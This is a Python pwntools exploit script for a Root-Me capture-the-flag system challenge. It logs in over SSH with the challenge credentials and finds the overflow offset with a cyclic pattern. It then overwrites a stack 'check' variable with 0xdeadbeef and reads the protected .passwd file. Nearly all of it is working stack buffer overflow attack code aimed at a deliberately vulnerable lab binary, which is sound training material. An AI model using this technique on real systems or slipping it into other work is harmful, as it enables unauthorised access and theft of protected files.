#!/usr/bin/env python3

from pwn import *
import time
import re
import sys

HOST = 'challenge02.root-me.org'
PORT = 2222
USER = 'app-systeme-ch13'
PASS = 'app-systeme-ch13'

BINARY_PATH = "/challenge/app-systeme/ch13/ch13"
LOCAL_COPY  = "/tmp/ch13"

def send_and_print(shell, cmd, timeout=10):
    if isinstance(cmd, bytes):
        display = cmd.decode(errors='replace')
    else:
        display = cmd

    log.info(f"[HOST] $ {display}")

    try:
        shell.sendline(cmd)
    except (OSError, EOFError) as e:
        log.failure(e)
        log.failure(f"unable to send command via socket: {cmd}")
        shell.close()
        sys.exit(1)

    output = b''

    while True:
        try:
            data = shell.recvuntil(b'$ ', timeout=timeout)
            output += data
            break
        except TimeoutError:
            continue
        except EOFError:
            log.failure("unable to send command via socket")
            break

    if output:
        print(output.decode(errors='replace').strip())

    return output


def find_check_offset(conn):
    pattern = cyclic(64, n=4)

    io = conn.process([BINARY_PATH])
    io.sendline(pattern)
    out = io.recvall(timeout=5).decode(errors='replace')
    io.close()

    m = re.search(r'\[check\]\s+(0x[0-9a-fA-F]+)', out)
    if not m:
        log.failure("Couldn't find '[check] 0x...' in output:")
        log.failure(out)
        sys.exit(1)

    leaked = int(m.group(1), 16)
    offset = cyclic_find(p32(leaked), n=4)

    if offset < 0:
        log.failure(f"leaked value {leaked:#x} not found in cyclic pattern")
        sys.exit(1)

    log.info(f"check leaked back as: {leaked:#x}")
    log.info(f"offset to `check`   : {offset} bytes")
    return offset


def main():
    context(arch='i386', os='linux')

    conn = ssh(
        host=HOST,
        port=PORT,
        user=USER,
        password=PASS,
        timeout=10
    )
    time.sleep(4)

    shell = conn.shell("/bin/sh")
    try:
        shell.recvuntil(b'$ ', timeout=10)
    except Exception:
        log.failure("[-] Failed to get host shell")
        conn.close()
        sys.exit(1)

    send_and_print(shell, "ls -larh && pwd")

    # Pull the binary down locally so pwntools' ELF() can parse it directly
    conn.download_file(BINARY_PATH, LOCAL_COPY)
    elf = ELF(LOCAL_COPY)
    context.binary = elf

    offset = find_check_offset(conn)

    payload = b'A' * offset + p32(0xdeadbeef, endianness="little")

    io = conn.process([BINARY_PATH, payload])
    io.sendline(payload)

    time.sleep(2)
    out = io.recvrepeat(timeout=5).decode(errors='replace')
    log.failure(out)

    m = re.search(r'\[check\]\s+(0x[0-9a-fA-F]+)', out)
    if m:
        log.info(f"Overwritten `check` address/value: {m.group(1)}")
    else:
        log.failure("Didn't see the [check] line in output")

    send_and_print(io, "cat .passwd", timeout=5)
    io.close()
    conn.close()

if __name__ == '__main__':
    main()

